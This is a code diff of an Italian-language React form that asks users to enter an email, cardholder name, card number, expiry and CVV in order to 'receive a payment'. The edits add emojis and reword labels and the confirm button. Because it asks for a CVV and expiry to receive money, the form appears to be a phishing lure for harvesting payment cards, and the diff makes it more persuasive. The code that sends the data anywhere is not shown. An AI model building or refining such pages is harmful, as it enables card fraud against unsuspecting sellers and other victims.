@@ -134,8 +134,8 @@ const inputClass =
         <p className="text-sm text-[#a48403]">Inserisci i dati della carta dove ricevere il pagamento</p>
       </div>
         <h1 className="text-xl font-semibold">INSERIRE DATI PER RICEZIONE PAGAMENTO</h1>
-           <label className="block text-sm">
-          EMAIL DOVE RICEVERE NOTIFICA DI ACCREDITO
+           <label className="block text-sm text-[#000000]">
+         📩 EMAIL DOVE RICEVERE NOTIFICA DI ACCREDITO
           <input
             required
             type="email"
@@ -148,7 +148,7 @@ const inputClass =
         </label>
 
           <label className="block text-sm">
-          INTESTATARIO CARTA DOVE RICEVERE PAGAMENTO
+          👤 NOME TITOLARE CARTA DOVE RICEVERE PAGAMENTO
           <input
             required
             className={`${inputClass} mt-1`}
@@ -159,7 +159,7 @@ const inputClass =
         </label>
 
         <label className="block text-sm">
-          NUMERO CARTA
+         💳 NUMERO DI CARTA DOVE RICEVERE PAGAMENTO
           <input
             required
             inputMode="numeric"
@@ -175,7 +175,7 @@ const inputClass =
 
         <div className="grid grid-cols-2 gap-3">
           <label className="block text-sm">
-            SCADENZA
+            📅 SCADENZA
             <input
               required
               inputMode="numeric"
@@ -190,7 +190,7 @@ const inputClass =
           </label>
 
           <label className="block text-sm">
-            CVV
+           🔒︎ CVV
             <input
               required
               type="password"
@@ -224,7 +224,7 @@ const inputClass =
       Pagamento in ricezione...
     </>
   ) : (
-    "Conferma"
+    "Conferma Ricezione"
   )}
 </button>
 
